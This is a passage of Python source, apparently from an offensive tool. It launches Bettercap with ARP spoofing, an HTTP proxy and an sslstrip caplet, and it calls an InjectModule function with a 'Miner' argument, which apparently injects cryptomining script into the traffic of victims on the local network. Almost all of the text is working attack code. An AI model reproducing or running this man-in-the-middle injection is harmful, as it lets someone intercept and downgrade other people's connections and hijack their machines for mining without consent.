        os.system(Bettercap + " -iface " + Interface + " -caplet ./lib/bettercap_inject.cap -eval \"set http.proxy.port " + Port + "\"")

    if Mode == "2":

        targets_string=BettercapArray("targets")
        os.system(Bettercap + " -iface " + Interface + " -caplet ./lib/bettercap_inject.cap -eval \"set http.proxy.port " + Port + ";set arp.spoof.targets " + targets_string + "\"")

    if Mode == "3":

        ignore_string=BettercapArray("ignore")
        os.system(Bettercap + " -iface " + Interface + " -caplet ./lib/bettercap_inject.cap -eval \"set http.proxy.port " + Port + ";set arp.spoof.whitelist " + ignore_string + "\"")





def Bettercap_HttpsInject(Miner,Interface,Port,Mode):

    platform_used=platform.system()
    if platform_used == "Windows":

       Bettercap = "./lib/bettercap.exe"

    else:

       Bettercap = "./lib/bettercap"

    InjectModule(Miner)

    if Mode == "1":

        os.system(Bettercap + " -iface " + Interface + " -caplet ./lib/bettercap_inject_sslstrip.cap -eval \"set http.proxy.port " + Port + "\"")

    if Mode == "2":

        targets_string=BettercapArray("targets")
        os.system(Bettercap + " -iface " + Interface + " -caplet ./lib/bettercap_inject_sslstrip.cap -eval \"set http.proxy.port " + Port + ";set arp.spoof.targets " + targets_string + "\"")

    if Mode == "3":

        ignore_string=BettercapArray("ignore")
        os.system(Bettercap + " -iface " + Interface + " -caplet ./lib/bettercap_inject_sslstrip.cap -eval \"set http.proxy.port " + Port + ";set arp.spoof.whitelist " + ignore_string + "\"")

        


